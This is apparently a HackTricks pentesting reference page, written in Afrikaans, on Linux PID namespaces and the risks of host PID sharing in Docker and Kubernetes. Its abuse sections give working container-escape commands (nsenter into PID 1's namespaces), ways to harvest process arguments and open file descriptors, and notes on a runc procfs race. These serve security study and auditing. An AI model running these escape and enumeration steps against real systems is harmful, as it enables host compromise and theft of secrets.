# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID namespace beheer hoe prosesse genommer word en watter prosesse sigbaar is. Dit is waarom 'n container sy eie PID 1 kan hê al is dit nie 'n regte masjien nie. Binne die namespace sien die workload wat na 'n plaaslike prosesboom lyk. Buiten die namespace sien die host steeds die ware host PIDs en die volledige proseslandskap.

Vanuit 'n sekuriteitsoogpunt maak die PID namespace 'n verskil omdat proses-sigbaarheid waardevol is. Sodra 'n workload host-prosesse kan sien, kan dit diensname, command-line argumente, geheime wat as prosesargumente deurgegee word, omgewingsafgeleide toestand deur /proc, en potensiële teikens vir namespace-toegang waarneem. As dit meer kan doen as net om daardie prosesse te sien — byvoorbeeld seine stuur of ptrace gebruik onder die regte toestande — word die probleem baie ernstiger.

## Werking

'n Nuwe PID namespace begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word PID 1 vanuit die namespace se perspektief, wat ook beteken dat dit spesiale init-agtige semantiek kry vir verlate kinders en sein-gedrag. Dit verklaar baie container-oortraptighede rondom init-processes, zombie reaping, en waarom klein init-wrappers soms in containers gebruik word.

Die belangrike sekuriteitsles is dat 'n proses moontlik geïsoleer lyk omdat dit slegs sy eie PID-boom sien, maar daardie isolasie kan doelbewus verwyder word. Docker maak dit beskikbaar via `--pid=host`, terwyl Kubernetes dit doen met `hostPID: true`. Sodra die container by die host PID namespace aansluit, sien die workload host-prosesse direk, en baie later aanvalspaaie word baie meer realisties.

## Lab

To create a PID namespace manually:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou 'n privaat proses-uitsig. Die `--mount-proc` vlag is belangrik omdat dit 'n procfs-instantie mount wat ooreenstem met die nuwe PID namespace, wat die proseslys van binne af koherent maak.

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, daarom is dit 'n goeie eerste laboratorium vir lesers.

## Runtime Gebruik

Normale containers in Docker, Podman, containerd en CRI-O kry hul eie PID-namespace. Kubernetes Pods kry gewoonlik ook 'n geïsoleerde PID-uitsig, tensy die workload uitdruklik versoek vir host PID sharing. LXC/Incus-omgewings vertrou op dieselfde kernel-primitive, alhoewel system-container gebruiksgevalle meer ingewikkelde prosesbome kan openbaar en meer debugging-kortpaaie kan aanmoedig.

Dieselfde reël geld oral: as die runtime gekies het om nie die PID-namespace te isoleer nie, is dit 'n doelbewuste vermindering van die container-grens.

## Misconfigurasies

Die tipiese miskonfigurasie is host PID sharing. Span­ne regverdig dit dikwels vir debugging, monitoring of gerief by diensbestuur, maar dit moet altyd as 'n betekenisvolle sekuriteitsuitsondering beskou word. Selfs al het die container geen direkte write primitive oor host-prosesse nie, kan blote sigbaarheid baie oor die stelsel openbaar. Sodra capabilities soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, vergroot die risiko aansienlik.

Nog 'n fout is om aan te neem dat omdat die workload standaard nie host-prosesse kan kill of ptrace nie, host PID sharing dus onskadelik is. Daardie gevolgtrekking ignoreer die waarde van enumerasie, die beskikbaarheid van namespace-entry teikens, en die manier waarop PID-sigbaarheid saamwerk met ander verswakte kontroles.

## Misbruik

As die host PID-namespace gedeel word, kan 'n aanvaller host-prosesse inspekteer, prosesargumente oes, interessante dienste identifiseer, kandidaat-PIDs vir `nsenter` opspoor, of proses-sigbaarheid kombineer met ptrace-verwante voorreg om met host of aangrensende workloads te inmeng. In sommige gevalle is dit al genoeg om net die regte langlopende proses te sien om die res van die aanvalplan te hervorm.

Die eerste praktiese stap is altyd om te bevestig dat host-prosesse werklik sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host PIDs sigbaar is, word prosesargumente en namespace-entry teikens dikwels die nuttigste inligtingsbron:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
As `nsenter` beskikbaar is en genoeg privilege bestaan, toets of 'n sigbare host-proses as 'n namespace-brug gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer is, is host PID sharing reeds waardevol omdat dit die diensindeling, runtime-komponente en kandidaat-privilegieerde prosesse blootlê wat volgende geteiken kan word.

Host PID visibility maak file-descriptor abuse ook meer realisties. As 'n privileged host process of neighboring workload 'n sensitiewe file of socket oop het, mag die attacker dalk die `/proc/<pid>/fd/` inspekteer en daardie handle hergebruik, afhangend van ownership, procfs mount options, en die target service model.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat hulle bepaal of `hidepid=1` of `hidepid=2` die kruis-proses sigbaarheid verminder en of duidelik interessante deskriptoren, soos oop geheime lêers, logs of Unix sockets, sigbaar is.

### Volledige voorbeeld: host PID + `nsenter`

Host PID-sharing word 'n direkte host-ontsnapping wanneer die proses ook genoeg voorregte het om by die host namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
As die opdrag slaag, voer die container process nou uit in die host mount, UTS, network, IPC, and PID namespaces. Die impak is onmiddellike kompromittering van die host.

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat deur die host binary bewerkstellig word as die host filesystem gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Onlangse runtime-notas

Sommige PID-namespace-relevante aanvalle is nie tradisionele `hostPID: true` wanconfigurasies nie, maar runtime-implementeringsfoute rondom hoe procfs-beskermings toegepas word tydens container-opstelling.

#### `maskedPaths` wedloop na host procfs

In kwesbare `runc` weergawes kon aanvallers wat die container-image of `runc exec` workload beheer, die masking-fase wedloop deur die container-side `/dev/null` te vervang met 'n symlink na 'n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. As die wedloop sou slaag, kon die masked-path bind-mount op die verkeerde teiken beland en host-globale procfs-instellings aan die nuwe container blootstel.

Nuttige opdrag:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde kan wees as 'n direkte procfs-blootstelling: skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur host code execution of denial of service.

#### Namespace injection met `insject`

Namespace injection-tools soos `insject` toon dat PID-namespace-interaksie nie altyd vereis dat die teiken-namespace vooraf betree word voordat 'n proses geskep word nie. 'n helper kan later aanheg, gebruik `setns()`, en uitvoer terwyl dit sigbaarheid in die teiken PID-ruimte behou:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik relevant vir gevorderde debugging, offensive tooling en post-exploitation-werkvloei waar namespace-konteks eers aangesluit moet word nadat die runtime die workload reeds geïnitialiseer het.

### Verwante FD-misbruikpatrone

Daar is twee patrone wat uitgelig moet word wanneer host PIDs sigbaar is. Eerstens kan 'n privileged process 'n sensitiewe file descriptor oop hou oor `execve()` omdat dit nie met `O_CLOEXEC` gemerk was nie. Tweedens kan services file descriptors oor Unix sockets deur `SCM_RIGHTS` deurgee. In albei gevalle is die interessante objek nie meer die padnaam nie, maar die reeds oop handle wat 'n laer-privilegie proses kan erf of ontvang.

Dit is relevant in container-werk omdat die handle na `docker.sock`, 'n privileged log, 'n gasheer geheime lêer, of 'n ander hoëwaarde-objek kan wys, selfs wanneer die pad self nie direk vanuit die container se lêerstelsel bereikbaar is nie.

## Checks

Die doel van hierdie opdragte is om te bepaal of die proses 'n private PID-aansig het of reeds 'n veel wyer stel prosesse kan opnoem.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Wat hier interessant is:

- As die proseslys voor die hand liggende host services bevat, is host PID sharing waarskynlik reeds in effek.
- Om slegs 'n klein container-local boom te sien is die normale basislyn; om `systemd`, `dockerd`, of ander, nie-verwante daemons te sien, is nie die geval nie.
- Sodra host PIDs sigbaar is, word selfs read-only prosesinligting nuttige verkenning.

As jy 'n container ontdek wat met host PID sharing loop, behandel dit nie as 'n kosmetiese verskil nie. Dit is 'n groot verandering in wat die workload kan waarneem en moontlik beïnvloed.
{{#include ../../../../../banners/hacktricks-training.md}}
